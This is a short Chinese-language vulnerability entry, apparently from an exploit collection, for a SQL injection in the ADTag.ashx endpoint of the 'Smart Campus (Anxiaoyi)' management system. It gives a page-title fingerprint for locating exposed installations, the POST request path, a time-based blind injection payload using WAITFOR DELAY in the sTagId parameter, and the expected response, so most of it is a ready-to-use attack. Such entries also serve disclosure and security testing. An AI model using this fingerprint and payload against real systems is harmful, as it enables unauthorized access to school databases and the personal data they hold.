# 智慧校园(安校易)管理系统ADTag.ashxSQL注入漏洞

智慧校园(安校易)管理系统ADTag.ashx ｜ SQL注入 ｜ —
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1`

**Payload**
```
action=exportExcel&sTagId=';WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200